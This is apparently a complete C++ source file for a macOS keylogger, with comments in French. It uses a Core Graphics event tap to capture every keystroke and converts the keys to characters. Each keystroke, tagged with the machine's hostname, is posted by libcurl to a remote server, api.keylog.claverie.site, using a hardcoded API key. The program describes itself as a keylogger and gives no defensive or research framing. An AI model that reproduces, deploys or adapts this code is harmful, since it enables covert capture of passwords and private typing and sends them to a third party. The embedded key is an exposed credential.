#include <ApplicationServices/ApplicationServices.h>
#include <CoreFoundation/CoreFoundation.h>
#include <curl/curl.h>
#include <unistd.h>
#include <string>
#include <mutex>
#include <thread>
#include <atomic>
#include <iostream>
#include <sstream>
#include <sys/utsname.h>

static std::string g_server_url = "https://api.keylog.claverie.site";
static std::string g_api_key    = "72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ";
static std::string g_machine;
static std::string g_logs_buffer;
static std::mutex  g_mutex;
static std::atomic<bool> g_running(true);

// Utilitaire : hostname
std::string get_machine_name() {
    struct utsname uts;
    if (uname(&uts) == 0) {
        return std::string(uts.nodename);
    }
    return "unknown-mac";
}

// Envoi HTTP d'un buffer
void send_logs(const std::string &logs) {
    if (logs.empty()) return;

    std::string url = g_server_url + "/upload_keys";
    std::string machine = g_machine;
    std::string payload = std::string("{\"machine\":\"") + machine + "\",\"logs\":\"";

    // échapper minimalement
    for (char c : logs) {
        if (c == '\\' || c == '\"') {
            payload.push_back('\\');
            payload.push_back(c);
        } else if (c == '\n') {
            payload += "\\n";
        } else if (c == '\r') {
            payload += "\\r";
        } else if (c == '\t') {
            payload += "\\t";
        } else {
            payload.push_back(c);
        }
    }
    payload += "\"}";

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl init error\n";
        return;
    }

    struct curl_slist *headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    std::string api_header = "X-API-Key: " + g_api_key;
    headers = curl_slist_append(headers, api_header.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, payload.size());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 3000L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

    std::cerr << "SEND: " << payload << "\n";
    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    if (res != CURLE_OK) {
        std::cerr << "curl error: " << curl_easy_strerror(res) << "\n";
    } else {
        std::cerr << "HTTP status: " << http_code << "\n";
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
}

// Thread périodique de sécurité (si jamais quelque chose reste dans le buffer)
void sender_thread_func() {
    while (g_running.load()) {
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        std::string to_send;
        {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (!g_logs_buffer.empty()) {
                to_send.swap(g_logs_buffer);
            }
        }
        if (!to_send.empty()) {
            send_logs(to_send);
        }
    }
}

// Conversion simple keycode -> char (en utilisant l'API système)
char event_to_char(CGEventRef event) {
    UniChar chars[4];
    UniCharCount count = 0;
    CGEventKeyboardGetUnicodeString(event, 4, &count, chars);
    if (count > 0) {
        // Ne garder que le premier caractère, converti en char simple (UTF-8 basique)
        return static_cast<char>(chars[0]);
    }
    return 0;
}

// Callback clavier
CGEventRef event_tap_callback(CGEventTapProxy proxy,
                              CGEventType type,
                              CGEventRef event,
                              void *refcon) {
    if (type != kCGEventKeyDown) {
        return event;
    }

    std::cerr << "KEYDOWN event\n";

    CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    std::string to_append;

    // Mapping de quelques touches spéciales par keycode (layout mac standard)
    // 36 = Return, 49 = Space, 48 = Tab, 51 = Delete, 53 = ESC
    if (keycode == 53) {
        to_append = "[ESC]";
    } else if (keycode == 49) {
        to_append = " ";
    } else if (keycode == 36) {
        to_append = "\n";
    } else if (keycode == 48) {
        to_append = "\t";
    } else {
        char c = event_to_char(event);
        if (c != 0) {
            to_append.push_back(c);
        }
    }

    if (to_append.empty()) {
        return event;
    }

    {
        std::lock_guard<std::mutex> lock(g_mutex);
        g_logs_buffer += to_append;
        std::string now = g_logs_buffer;
        g_logs_buffer.clear();
        send_logs(now);
    }

    return event;
}

int main(int argc, char *argv[]) {
    if (argc >= 2) {
        g_server_url = argv[1];
    }
    if (argc >= 3) {
        g_api_key = argv[2];
    }

    g_machine = get_machine_name();

    // Petit test réseau au démarrage
//    send_logs("HELLO");

    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(kCGHIDEventTap,
                                              kCGHeadInsertEventTap,
                                              kCGEventTapOptionListenOnly,
                                              mask,
                                              event_tap_callback,
                                              nullptr);
    if (!eventTap) {
        std::cerr << "Failed to create event tap. Verifie les permissions Accessibilite.\n";
        return 1;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(runLoop, runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    std::thread sender(sender_thread_func);

    std::cout << "macOS native keylogger started for machine: " << g_machine << "\n";
    CFRunLoopRun();

    g_running.store(false);
    sender.join();

    if (eventTap) {
        CFRunLoopRemoveSource(runLoop, runLoopSource, kCFRunLoopCommonModes);
        CFRelease(runLoopSource);
        CFMachPortInvalidate(eventTap);
        CFRelease(eventTap);
    }

    return 0;
}

